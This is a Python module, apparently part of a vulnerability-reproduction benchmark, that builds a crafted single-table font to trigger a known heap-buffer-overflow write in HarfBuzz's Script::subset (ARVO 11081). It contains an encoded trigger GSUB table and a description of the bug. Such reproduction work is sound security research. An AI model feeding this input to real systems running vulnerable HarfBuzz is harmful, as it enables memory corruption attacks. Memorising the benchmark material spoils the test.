"""CG-12（arvo:11081 / harfbuzz）输入构造器：hb-subset-fuzzer 的 GSUB 触发字体。

缺陷位置：OT::Script::subset()（hb-ot-layout-common.hh:289）
先 embed(*this) 再写 langSys 记录；embed 用 get_size() 估长度，
而 get_size() 里 "size - array[0].min_size + array.get_size()"（hb-machinery.hh:121）
在 Script 的 langSys 数组为空/越界时给出偏小的长度，于是紧接着写
out->langSys.arrayZ[i].offset.serialize_subset(...) 就把记录写到分配区之外：
ASAN 报 heap-buffer-overflow（WRITE of size 1 @ BEInt<unsigned short,2>::set, hb-machinery.hh:650）。
fix 版（array.min_size + 同批 sanity 改动）不再越界。

输入形态：一个只有 GSUB 表的极简 sfnt。GSUB 里是一个 Script 记录 + 空 langSys 数组，
后面跟一段 0x20 填充——正是这段填充让越界写落到堆边界之外（实测 838B 表长稳定触发，
裁短到 600B 就不再越界）。838B 表以 zlib+base64 内联，构建时解压，避免把二进制塞进源码。
"""
from __future__ import annotations

import base64
import hashlib
import struct
import zlib

SFNT_VERSION = 0x00010000
GSUB_TAG = b"GSUB"
GSUB_TRIGGER_B64 = (
    "eNpjYGRgZLBiUGBgVMAKGNjApAImCZIBkg0MbCA2HDIwiIBl2Bi0gSQDAwdCD4jxR4E08B+b"
    "GFgQaDbUWAYGBdqD/2CL/ysMFBg4m2nmo//Dxk8AA/Jtkg=="
)
GSUB_TRIGGER_SHA256 = "606481304f3bbba138a61994e70a9f4cf4e5049f7cc4589683a274adeb889a7a"
TABLE_TAG = "GSUB"


class HBFontResult:
    """构造结果（普通类：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", format="harfbuzz-sfnt", fields_used=None,
                 dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = format
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self):
        return len(self.data)

    def to_record(self):
        return {"ok": self.ok, "format": self.format, "size": len(self.data),
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


FIELDS = {
    "tag": "str, 表标签（默认 GSUB；必须是 GSUB 才能触发 Script::subset 越界）",
    "gsub_b64": "str, 覆盖内联的触发表（zlib+base64），调试用",
    "pad_to": "int, 把整个字体补齐到该字节数（默认不补）",
}


def gsub_trigger() -> bytes:
    """解压内联的 838B GSUB 触发表（自检 sha256，防止静默损坏）。"""
    raw = zlib.decompress(base64.b64decode(GSUB_TRIGGER_B64))
    if hashlib.sha256(raw).hexdigest() != GSUB_TRIGGER_SHA256:
        raise ValueError("GSUB 触发表 sha256 不匹配（内联常量被改动）")
    return raw


def sfnt_with_table(tag: bytes, data: bytes) -> bytes:
    """单表 sfnt：12B 头 + 16B 目录 + 表体（4 字节对齐）。"""
    if len(tag) != 4:
        raise ValueError("表标签必须是 4 字节")
    n = 1
    header = struct.pack(">IHHHH", SFNT_VERSION, n, 0, 0, 0)
    offset = 12 + 16 * n
    entry = tag + struct.pack(">III", 0, offset, len(data))
    body = data + b"\x00" * ((4 - len(data) % 4) % 4)
    return header + entry + body


def build(fields: dict) -> HBFontResult:
    """按字段组装触发字体；默认就是最小可触发形态（只有 GSUB）。"""
    fields = fields or {}
    used, dropped = {}, []
    tag = str(fields.get("tag") or TABLE_TAG)
    if len(tag) != 4:
        return HBFontResult(False, reason="tag 必须是 4 个字符")
    if tag.upper() != "GSUB":
        return HBFontResult(False, reason="只有 GSUB 表能触发 Script::subset 越界")
    try:
        table = (zlib.decompress(base64.b64decode(fields["gsub_b64"]))
                 if fields.get("gsub_b64") else gsub_trigger())
    except Exception as exc:
        return HBFontResult(False, reason="gsub_b64 解压失败: %s" % exc)
    if not table:
        return HBFontResult(False, reason="GSUB 表为空")
    used.update({"tag": tag, "table_size": len(table)})

    data = sfnt_with_table(tag.encode("ascii"), table)
    pad_to = fields.get("pad_to")
    if pad_to is not None:
        try:
            pad_to = int(pad_to)
        except (TypeError, ValueError):
            return HBFontResult(False, reason="pad_to 必须是整数")
        if pad_to < len(data):
            return HBFontResult(False, reason="pad_to 小于当前长度")
        data += b"\x00" * (pad_to - len(data))
        used["pad_to"] = pad_to
    for key in fields:
        if key not in FIELDS:
            dropped.append({"field": key, "reason": "harfbuzz 构造器不识别该字段"})
    return HBFontResult(True, data, "harfbuzz-sfnt", used, dropped)


def proof_of_concept() -> bytes:
    """ARVO 11081 的触发输入：只有 GSUB 表的 866B sfnt。"""
    res = build({})
    if not res.ok:
        raise RuntimeError("harfbuzz builder failed: " + res.reason)
    return res.data
